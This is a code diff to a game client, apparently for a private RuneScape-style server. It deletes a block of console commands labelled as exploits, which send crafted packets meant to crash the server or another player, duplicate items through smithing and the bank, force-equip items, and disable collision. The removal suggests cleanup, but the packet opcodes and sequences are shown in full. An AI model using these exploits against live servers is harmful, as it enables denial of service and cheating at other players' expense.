@@ -1668,94 +1668,6 @@ public class Client extends GameRenderer {
 				consoleMessages[j] = null;
 			}
 		}
-		// testing exploits
-		if (cmd.equalsIgnoreCase("if")) { // make over mage interface
-				getOut().putOpcode(185);
-				final int id = 3559;
-				getOut().putShort(id); //drops interface
-				pushMessage("Tried to open interface "+id, 0, "");
-		}
-		if (cmd.equalsIgnoreCase("btn1")) { // lock xp
-			getOut().putOpcode(185);
-			final int id = 15004;
-			getOut().putShort(id);
-			pushMessage("Tried to press btn "+id, 0, "");
-		}
-		if (cmd.equalsIgnoreCase("btn2")) { // herb skilling tele
-			getOut().putOpcode(185);
-			final int id = 8861;
-			getOut().putShort(id);
-			pushMessage("Tried to press btn "+id, 0, "");
-		}
-		if (cmd.equalsIgnoreCase("btn3")) { // tele somewhere
-			getOut().putOpcode(185);
-			final int id = 8659;
-			getOut().putShort(id); //drops interface
-			pushMessage("Tried to press btn "+id, 0, "");
-		}
-		if (cmd.equalsIgnoreCase("btn4")) { // make over mage interface
-			getOut().putOpcode(185);
-			final int id = 26229;
-			getOut().putShort(id); //drops interface
-			pushMessage("Tried to do dungeoneering btn "+id, 0, "");
-		}
-		if (cmd.equalsIgnoreCase("c")) { // crash
-			//while (loggedIn) {
-				//sleep(100);
-				pushMessage("Attempting to crash the server.", 0, "");
-				getOut().putOpcode(4); // player.getStream().createFrame(4);
-				getOut().putShort(6969); // player.getStream().writeWord(6969);
-				getOut().writeUnsignedWordBigEndian(123123); // player.getStream().writeWordBigEndian(123123);
-			//}
-		}
-		if (cmd.equalsIgnoreCase("crash")) {
-			pushMessage("Attempting to crash \"crash\"", 0, "");
-			String message = "what level should i start killing lavas?�";
-			long aLong953 = TextClass.longForName("crash"); //Replace "pure noob" with the person you want to crash
-
-			getOut().putOpcode(126); //player.getStream().createFrame(126);
-			getOut().writeUnsignedWordBigEndian(0); // player.getStream().writeWordBigEndian(0);
-			int k = getOut().position; // player.getStream().currentOffset;
-			getOut().putLong(aLong953); //player.getStream().writeQWord(aLong953);
-			TextInput.writeChatboxText(message, getOut());
-			getOut().putVariableSizeByte(getOut().position - k);
-			message = TextInput.processText(message);
-			pushMessage(promptInput, 6, TextClass.fixName(TextClass.nameForLong(aLong953)));
-		}
-		if (cmd.equalsIgnoreCase("sm")) { // smithing exploit
-			pushMessage("Attempting to smith abyssal whip", 0, "");
-			getOut().putOpcode(145);
-			getOut().writeUnsignedWordA(1119);
-			getOut().writeUnsignedWordA(4151);
-			getOut().writeUnsignedWordA(4151);
-		}
-		if (cmd.equalsIgnoreCase("eq")) { // force equip
-			pushMessage("Attempting to equip coins from the first slot, slot 0.", 0, "");
-			getOut().putOpcode(41);
-			getOut().putShort(995);
-			getOut().writeUnsignedWordA(0);
-			getOut().writeUnsignedWordA(3214); //3214 = Inventory interface
-		}
-		if (cmd.equalsIgnoreCase("b1")) { // open bank dialogue
-			pushMessage("Sent bank dialogue request", 0, "");
-			sendBankDialogueRequest();
-		}
-		if (cmd.equalsIgnoreCase("b2")) { // send bank exploit
-			pushMessage("Sent bank exploit", 0, "");
-			sendBankExploit();
-		}
-		if (cmd.equalsIgnoreCase("b3")) { // send bank all
-			pushMessage("Sent bank all", 0, "");
-			sendBankAll();
-		}
-		if (cmd.equalsIgnoreCase("nc")) {
-			pushMessage("Sent noclip exploit", 0, "");
-			for (int k1 = 0; k1 < 4; k1++)
-				for (int i2 = 1; i2 < 103; i2++)
-					for (int k2 = 1; k2 < 103; k2++)
-						clippingPlanes[k1].clipData[i2][k2] = 0;
-		}
-		// exploits above
 		if(cmd.equalsIgnoreCase("chk")) {
 			System.out.println(GameFrame.getScreenMode());
 		}
@@ -1841,26 +1753,6 @@ public class Client extends GameRenderer {
 			getOut().putByte(cmd.length() + 1);
 			getOut().putString(cmd);
 		}
-	}
-
-	public void sendBankDialogueRequest() {
-		getOut().putOpcode(185);
-		getOut().putShort(5294); // write word
-		sendBankExploit();
-	}
-
-
-	private void sendBankExploit() {
-		System.out.println("Sent bank exploit.");
-		getOut().putOpcode(185);
-		getOut().putShort(2462); // write word
-		sendBankAll();
-	}
-
-	private void sendBankAll() {
-		System.out.println("Sent bank all.");
-		getOut().putOpcode(185);
-		getOut().putShort(22012);
 	}
 
 	private void addFriend(long nameAsLong) {
